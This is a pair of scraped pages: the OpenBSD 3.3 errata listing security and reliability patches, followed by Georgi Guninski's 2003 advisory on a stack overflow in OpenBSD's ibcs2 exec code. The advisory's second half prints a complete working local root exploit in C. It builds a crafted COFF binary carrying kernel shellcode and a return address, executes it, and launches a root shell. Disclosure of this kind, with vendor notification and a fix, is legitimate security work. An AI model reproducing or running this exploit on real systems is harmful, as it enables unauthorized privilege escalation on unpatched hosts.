=== Content from www.openbsd.org_634852d6_20250124_195103.html ===


OpenBSD 3.3 Errata

## [*Open***BSD**](index.html) 3.3 Errata

---

For errata on a certain release, click below:

[2.0](errata20.html),
[2.1](errata21.html),
[2.2](errata22.html),
[2.3](errata23.html),
[2.4](errata24.html),
[2.5](errata25.html),
[2.6](errata26.html),
[2.7](errata27.html),
[2.8](errata28.html),
[2.9](errata29.html),
[3.0](errata30.html),
[3.1](errata31.html),
[3.2](errata32.html),
[3.4](errata34.html),
[3.5](errata35.html),
[3.6](errata36.html),

[3.7](errata37.html),
[3.8](errata38.html),
[3.9](errata39.html),
[4.0](errata40.html),
[4.1](errata41.html),
[4.2](errata42.html),
[4.3](errata43.html),
[4.4](errata44.html),
[4.5](errata45.html),
[4.6](errata46.html),
[4.7](errata47.html),
[4.8](errata48.html),
[4.9](errata49.html),
[5.0](errata50.html),
[5.1](errata51.html),
[5.2](errata52.html),

[5.3](errata53.html),
[5.4](errata54.html),
[5.5](errata55.html),
[5.6](errata56.html),
[5.7](errata57.html),
[5.8](errata58.html),
[5.9](errata59.html),
[6.0](errata60.html),
[6.1](errata61.html),
[6.2](errata62.html),
[6.3](errata63.html),
[6.4](errata64.html),
[6.5](errata65.html),
[6.6](errata66.html),
[6.7](errata67.html),
[6.8](errata68.html),

[6.9](errata69.html),
[7.0](errata70.html),
[7.1](errata71.html),
[7.2](errata72.html),
[7.3](errata73.html),
[7.4](errata74.html),
[7.5](errata75.html),
[7.6](errata76.html).

---

Patches for the OpenBSD base system are distributed as unified diffs.
Each patch contains usage instructions.
All the following patches are also available in one
[tar.gz file](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3.tar.gz)
for convenience.

Patches for supported releases are also incorporated into the
[-stable branch](stable.html).

---

* **001: SECURITY FIX: August 4, 2003**
    *All architectures*

  An off-by-one error exists in the C library function
  [realpath(3)](https://man.openbsd.org/OpenBSD-3.3/realpath.3).
  Since this same bug resulted in a root compromise in the wu-ftpd ftp server
  it is possible that this bug may allow an attacker to gain escalated privileges
  on OpenBSD.

  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/001_realpath.patch)

  * **002: RELIABILITY FIX: August 20, 2003**
      *All architectures*

    An improper bounds check in the
    [semget(2)](https://man.openbsd.org/OpenBSD-3.3/semget.2)
    system call can allow a local user to cause a kernel panic.

    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/002_semget.patch)

    * **003: SECURITY FIX: September 10, 2003**
        *All architectures*

      Root may be able to reduce the security level by taking advantage of
      an integer overflow when the semaphore limits are made very large.

      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/003_sysvsem.patch)

      * **004: SECURITY FIX: September 16, 2003**
          *All architectures*

        All versions of OpenSSH's sshd prior to 3.7 contain a buffer management error.
        It is unclear whether or not this bug is exploitable.

        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/004_sshbuffer.patch)
        NOTE: this is the *second* revision of the patch that fixes an additional
        problem.

        * **005: SECURITY FIX: September 17, 2003**
            *All architectures*

          A buffer overflow in the address parsing in
          [sendmail(8)](https://man.openbsd.org/OpenBSD-3.3/sendmail.8)
          may allow an attacker to gain root privileges.

          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/005_sendmail.patch)
          NOTE: this is the *second* revision of the patch that fixes an additional
          problem.

          * **006: SECURITY FIX: September 24, 2003**
              *All architectures*

            Three cases of potential access to freed memory have been found in
            [pf(4)](https://man.openbsd.org/OpenBSD-3.3/pf.4).
            At least one of them could be used to panic pf with active scrub rules remotely.

            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/006_pfnorm.patch)

            * **007: SECURITY FIX: October 1, 2003**
                *All architectures*

              The use of certain ASN.1 encodings or malformed public keys may allow an
              attacker to mount a denial of service attack against applications linked with
              [ssl(3)](https://man.openbsd.org/OpenBSD-3.3/ssl.3).
              This does not affect OpenSSH.

              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/007_asn1.patch)

              * **008: RELIABILITY FIX: October 1, 2003**
                  *All architectures*

                It is possible for a local user to cause a system panic by flooding it with spoofed ARP
                requests.

                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/008_arp.patch)

                * **009: RELIABILITY FIX: October 29, 2003**
                    *All architectures*

                  A user with write permission to `httpd.conf` or a `.htaccess`
                  file can crash
                  [httpd(8)](https://man.openbsd.org/OpenBSD-3.3/httpd.8)
                  or potentially run arbitrary code as the user `www` (although it
                  is believed that ProPolice will prevent code execution).

                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/009_httpd.patch)

                  * **010: RELIABILITY FIX: November 4, 2003**
                      *All architectures*

                    It is possible for a local user to cause a system panic by executing a specially crafted binary with an invalid header.

                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/010_exec.patch)

                    * **011: SECURITY FIX: November 17, 2003**
                        *i386 only*

                      It is possible for a local user to execute arbitrary code resulting in escalation of
                      privileges due to a stack overrun in
                      [compat\_ibcs2(8)](https://man.openbsd.org/OpenBSD-3.3/compat_ibcs2.8).

                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/i386/011_ibcs2.patch)

                      * **012: RELIABILITY FIX: November 20, 2003**
                          *All architectures*

                        It is possible for a local user to cause a crash via
                        [sysctl(3)](https://man.openbsd.org/OpenBSD-3.3/sysctl.3) with certain arguments.

                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/012_uvm.patch)

                        * **013: RELIABILITY FIX: November 20, 2003**
                            *All architectures*

                          An improper bounds check makes it possible for a local user to cause a crash
                          by passing the
                          [semctl(2)](https://man.openbsd.org/OpenBSD-3.3/semctl.2) and
                          [semop(2)](https://man.openbsd.org/OpenBSD-3.3/semop.2) functions
                          certain arguments.

                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/013_sem.patch)

                          * **014: SECURITY FIX: January 15, 2004**
                              *All architectures*

                            Several message handling flaws in
                            [isakmpd(8)](https://man.openbsd.org/OpenBSD-3.3/isakmpd.8)
                            have been reported by Thomas Walpuski. These allow an attacker to delete arbitrary SAs.

                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/014_isakmpd.patch)

                            * **015: SECURITY FIX: February 5, 2004**
                                *All architectures*

                              A reference counting bug exists in the
                              [shmat(2)](https://man.openbsd.org/OpenBSD-3.3/shmat.2)
                              system call that could be used by an attacker to write to kernel memory
                              under certain circumstances.

                              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/015_sysvshm.patch)

                              * **016: SECURITY FIX: February 8, 2004**
                                  *All architectures*

                                An IPv6 MTU handling problem exists that could be used by an attacker
                                to cause a denial of service attack against hosts with reachable IPv6
                                TCP ports.

                                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/016_ip6.patch)

                                * **017: RELIABILITY FIX: February 14, 2004**
                                    *All architectures*

                                  Several buffer overflows exist in the code parsing
                                  font.aliases files in XFree86. Thanks to ProPolice, these cannot be
                                  exploited to gain privileges, but they can cause the X server to abort.

                                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/017_font.patch)

                                  * **018: RELIABILITY FIX: March 8, 2004**
                                      *All architectures*

                                    OpenBSD's TCP/IP stack did not impose limits on how many out-of-order
                                    TCP segments are queued in the system. An attacker could
                                    send out-of-order TCP segments and trick the system into using all
                                    available memory buffers.

                                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/018_tcp.patch)

                                    * **019: SECURITY FIX: March 13, 2004**
                                        *All architectures*

                                      Due to a bug in the parsing of Allow/Deny rules for
                                      [httpd(8)'s](https://man.openbsd.org/OpenBSD-3.3/httpd.8)
                                      access module, using IP addresses without a netmask on big endian 64-bit
                                      platforms causes the rules to fail to match. This only affects sparc64.

                                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/019_httpd2.patch)

                                      * **020: RELIABILITY FIX: March 17, 2004**
                                          *All architectures*

                                        Defects in the payload validation and processing functions of
                                        [isakmpd(8)](https://man.openbsd.org/OpenBSD-3.3/isakmpd.8)
                                        have been discovered. An attacker could send malformed ISAKMP messages and
                                        cause isakmpd to crash or to loop endlessly. This patch fixes these problems
                                        and removes some memory leaks.

                                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/020_isakmpd2.patch)

                                        * **021: RELIABILITY FIX: March 17, 2004**
                                            *All architectures*

                                          A missing check for a NULL-pointer dereference has been found in
                                          [ssl(3)](https://man.openbsd.org/OpenBSD-3.3/ssl.3).
                                          A remote attacker can use the bug to cause an OpenSSL application to crash;
                                          this may lead to a denial of service.

                                          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/021_openssl.patch)

                                          * **022: SECURITY FIX: May 5, 2004**
                                              *All architectures*

                                            Pathname validation problems have been found in
                                            [cvs(1)](https://man.openbsd.org/OpenBSD-3.3/cvs.1),
                                            allowing malicious clients to create files outside the repository, allowing
                                            malicious servers to overwrite files outside the local CVS tree on
                                            the client and allowing clients to check out files outside the CVS
                                            repository.

                                            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/3.3/common/022_cvs.patch)

---



=== Content from www.guninski.com_a9afffde_20250124_195101.html ===

## OpenBSD kernel overflow, yet still \*BSD much better than windows

| | cyrillic logo  [Home](index.html)  **Security**  [Internet Explorer](browsers.html)  [Windows 2000](win2k.html)  [AIX](exploit.html)  [Netscape](netscape.html)  [Misc](misc.html)  **Other**  [Links](greets.html)  [Services](me.html)  [In the news](menews.html)  [Random stuff](rand/index.html)  **Contact**  guninski@guninski.com | Georgi Guninski security advisory #64, 2003  OpenBSD kernel overflow, yet still \*BSD much better than windows  Please help Liu! Liu disclosed 13 explorer bugs on one day and now needs a computer of his own. Please donate at: <http://clik.to/donatepc> "The less that you give, you're a taker"  -- Black Sabbath, http://www.lyricsfreak.com/b/black-sabbath/19364.html   Systems affected: tested on OpenBSD 3.3 and 3.4, probably other versions also affected   Risk: Medium Date: 17 November 2003  Legal Notice: This Advisory is Copyright (c) 2003 Georgi Guninski. You may distribute it unmodified. You may not modify it and distribute it or distribute parts of it without the author's written permission - this especially applies to so called "vulnerabilities databases" and securityfocus, microsoft, cert and mitre. If you want to link to this content use the URL: http://www.guninski.com/msuxobsd2.html Anything in this document may change without notice.  Disclaimer: The information in this advisory is believed to be true though it may be false. The opinions expressed in this advisory and program are my own and not of any company. The usual standard disclaimer applies, especially the fact that Georgi Guninski is not liable for any damages caused by direct or  indirect use of the information or functionality provided by this advisory or program. Georgi Guninski bears no responsibility for content or misuse of this advisory or program or any derivatives thereof.  Description:  There is a stack based kernel overflow in OpenBSD 3.3,3.4 probably earlier  in ibcs2 code. Exploit code is available for 3.3. On 3.4 the kernel is  paniced with smashed stack, ease of exploitation is currently unknown.  Details: The problem is in: "ibcs2\_exec.c" line 427 of 738     char buf[128], \*bufp;         int len = sh.s\_size, path\_index, entry\_len;              error = vn\_rdwr(UIO\_READ, epp->ep\_vp, (caddr\_t) buf,                 len, sh.s\_scnptr,                 UIO\_SYSSPACE, IO\_NODELOCKED, p->p\_ucred,                 &resid, p);  len is taken from the binary and is used for copying in stack based buffer  which is wrong.  Oh, I forgot. Please help Liu! Liu disclosed 13 explorer bugs on one day and now needs a computer of his own. Please donate at: <http://clik.to/donatepc> "The less that you give, you're a taker"  -- Black Sabbath, http://www.lyricsfreak.com/b/black-sabbath/19364.html ``` -msuxobsd2.c--------------------------------------------------/* Legal Notice: This Advisory is Copyright (c) 2003 Georgi Guninski. This program cannot be used in "vulnerabilities databases" and  securityfocus, microsoft, cert and mitre. If you want to link to this content use the URL: http://www.guninski.com/msuxobsd2.html Anything in this document may change without notice.  Disclaimer: The information in this advisory is believed to be true though it may be false. The opinions expressed in this advisory and program are my own and not of any company. The usual standard disclaimer applies, especially the fact that Georgi Guninski is not liable for any damages caused by direct or  indirect use of the information or functionality provided by this advisory or program. Georgi Guninski bears no responsibility for content or misuse of this advisory or program or any derivatives thereof.  */ #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <stdio.h> #include <sys/mman.h> #include <unistd.h> #include <sys/param.h> #include <sys/sysctl.h> #include <sys/signal.h> #include <sys/utsname.h> #include <sys/stat.h> #include "/usr/src/sys/compat/ibcs2/ibcs2_exec.h"  // some code taken from noir article from phrack 60  void get_proc(pid_t pid, struct kinfo_proc *kp){   u_int arr[4], len;        arr[0] = CTL_KERN;        arr[1] = KERN_PROC;        arr[2] = KERN_PROC_PID;        arr[3] = pid;        len = sizeof(struct kinfo_proc);        if(sysctl(arr, 4, kp, &len, NULL, 0) < 0) {                perror("sysctl");                fprintf(stderr, "this is an unexpected error, rerun!\n");                exit(-1);        }}int msux(){int fd;struct coff_filehdr cf;struct coff_aouthdr ca;struct coff_scnhdr s1,s2,s3;int exe[512];char fil[]="/tmp/vvc";int v;unsigned int initpid=0xe7610000;unsigned int reta=0xe770fc8c;//0xe770bc68; //0xe7719c64;//0xe770bc64; struct kinfo_proc kp;long ppid,mypid;int p,st;get_proc((pid_t) getppid(), &kp);ppid=(u_long) kp.kp_eproc.e_paddr;get_proc((pid_t) getpid(), &kp);mypid=(u_long) kp.kp_eproc.e_paddr;// address of kernel's p_comm for 3.3 reta=0x10f+(u_long) kp.kp_eproc.e_paddr;printf("ppid=%x mypid=%x %reta=%x\n",ppid,mypid,reta);fd=open(fil,O_CREAT|O_RDWR,0700);if (fd==-1) {perror("open");return 1;}memset(&cf,0,sizeof(cf));memset(&ca,0,sizeof(ca));memset(&s1,0,sizeof(s1));memset(&s2,0,sizeof(s2));memset(&s3,0,sizeof(s3));//memset(exe,0xe7,sizeof(exe)); for(v=0;v<sizeof(exe)/sizeof(int);v++) {exe[v]= 0xbabe0000 + v; /*0xcafebabe;*/}exe[2]=ppid; // to avoid an early crash exe[1]=reta; // return address  p=st=3; //0xd;  exe[p++]=0xfebabeb9; // shell code exe[p++]=0x10598bca;exe[p++]=0x4389c031;exe[p++]=0x89138b04;exe[p++]=0x90900442;*(int*)((int)&exe[st]+1) = ppid;exe[p++]=0xbabeb850; // call exit1 to return in userland exe[p++]=0xb850cafe;exe[p++]=0xd01c59b8;exe[p++]=0x9090d0ff;*(int*)((int)&exe[st]+2+5*4) = mypid;cf.f_magic = COFF_MAGIC_I386 ;cf.f_nscns=3;ca.a_magic = COFF_ZMAGIC;s1.s_flags = COFF_STYP_TEXT;s2.s_flags = COFF_STYP_DATA;s3.s_flags = COFF_STYP_SHLIB;s3.s_size= 128+12*4 + 30*4; //sizeof(exe); write(fd,&cf,sizeof(cf));write(fd,&ca,sizeof(ca));write(fd,&s1,sizeof(s1));write(fd,&s2,sizeof(s2));write(fd,&s3,sizeof(s3));write(fd,exe,sizeof(exe));printf("Now exec %s\n",fil);execl(fil,0);exit(42); // should not be reached if successfull }  int main(int ac,char **av){uid_t ui;// this is kernel's p_comm. we first jump here. char goodfile[]="\x54\x58\x40\x40\x40\x40\xff\xd0";char tmp[1000];if (strcmp(av[0],goodfile))        {        snprintf(tmp,sizeof(tmp),"cp %s \"%s\"",av[0],goodfile);        system(tmp);execl(goodfile,goodfile,0);        return 42; //should not be reached         } printf("written by georgi\n");printf("\nPlease help Liu - http://clik.to/donatepc\n\n");fflush(stdout);#define SWEETDREAM 2   if(!fork()) msux();while(42){sleep(SWEETDREAM);ui=getuid();printf("uid=%x\n",ui);if (ui==0) execl("/bin/sh",0);}return 42;} ``` -----------------------------------------------  Vendor status: OpenBSD was notified on Sat, 15 Nov 2003 17:57:33 +0200. Fix: available in cvs for 3.4: <http://www.openbsd.org/cgi-bin/cvsweb/src/sys/compat/ibcs2/ibcs2_exec.c.diff?r1=1.14.6.1&r2=1.14.6.2> For earlier versions should be available shortly.  Regards, Georgi Guninski http://www.guninski.com | | --- | --- | |
| --- | --- | --- |
|  |

| [Home](index.html) | [Internet
Explorer](browsers.html) | [Windows 2000](win2k.html) | [AIX](exploit.html) | [Netscape](netscape.html) | [Links](greets.html) | [More...](index.html) |


